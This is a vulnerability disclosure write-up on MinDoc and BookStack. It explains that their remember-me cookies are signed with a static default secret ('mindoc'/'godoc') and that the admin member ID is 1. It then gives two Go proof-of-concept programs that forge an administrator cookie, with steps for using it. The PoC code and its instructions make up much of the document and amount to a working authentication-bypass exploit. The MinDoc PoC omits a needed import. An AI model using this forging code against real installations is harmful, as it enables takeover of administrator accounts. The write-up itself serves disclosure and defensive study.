## Vulnerable Detail

MinDoc and BookStack are document management system. They both develop their web services based on Beego. Besides, BookStack is based on MinDoc. They have same IDOR vulnerables.

### Execution track

All function are implemented by different **Controller**. **BaseController** (like Parent class) run the **Prepare()** at every beginning.

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/1.png)

In **Prepare()**, if applications do not get session information, they try to use cookie to access account.

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/22.png)

**GetSecureCookie()** is implemented by beego. In this function, it check if cookie has ***key*** field firstly. Then, it split this field to ***vs***, ***timestamp*** and ***sig***. It use sha256/sha1 algorithm and secret key ***Secret*** to encrypt the combination of ***vs*** and ***timestamp***. In the end, if ciphertext == ***sig***, it return the ***vs*** after decode by base64.

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/3.png)

In the next step, function **Decode(value,r)** deserialize the value into r. In this scene, ***value*** is the output of **GetSecureCookie()** and ***r*** is the object of the struct ***CookieRemember***.

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/5.png)

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/6.png)

After deserialization, appications use ***remember.MemberId*** find the account information and access the account.

### Unsafe logic

In summary, the first problem is in the parameter ***Secret*** of **GetSecureCookie()**. ***Secret*** is come from **conf.GetAppKey()**. This is a static value ("mindoc"/"godoc") and do not ask for changing the value in the setup stage. The second problem is that the default member Id of the administrator is 1. Based on these problems, we can forge the cookie to access the account of the administrator.

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/4.png)

### PoC

***PoC for Bookstack***

```golang
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"time"
)

type CookieRemember struct {
	MemberId int
	Account  string
	Time     time.Time
}

func main() {
	m := CookieRemember{MemberId: 1, Account: "2"}
	var network bytes.Buffer
	enc := gob.NewEncoder(&network)
	enc.Encode(m)
	encoded := base64.URLEncoding.EncodeToString([]byte(network.String()))
	fmt.Println("base64，vs:", encoded)
	s := "godoc"
	h := hmac.New(sha1.New, []byte(s))
	fmt.Fprintf(h, "%s%s", encoded, "123")
	a := fmt.Sprintf("%02x", h.Sum(nil))
	fmt.Println("sha1，sig:", a)
}
```

***PoC for Mindoc***

```golang
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"time"
)

type CookieRemember struct {
	MemberId int
	Account  string
	Time     time.Time
}

func main() {
	m := CookieRemember{MemberId: 1, Account: "2"}
	var network bytes.Buffer
	enc := gob.NewEncoder(&network)
	enc.Encode(m)
	encoded := base64.URLEncoding.EncodeToString([]byte(network.String()))
	fmt.Println("base64，vs:", encoded)
	s := "mindoc"
	h := hmac.New(sha256.New, []byte(s))
	fmt.Fprintf(h, "%s%s", encoded, "123")
	a := fmt.Sprintf("%02x", h.Sum(nil))
	fmt.Println("sha256，sig:", a)
 }
```
After get the fake ***sig*** and ***vs***, we can connect them by '\|' (need not to condsider *timestamp*). We replace the original cookie and access the account of the administrator.

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/8.png)

![](http://www.cinderxxx.live/mindoc-BookStack-IDOR-Vulnerable/9.png)

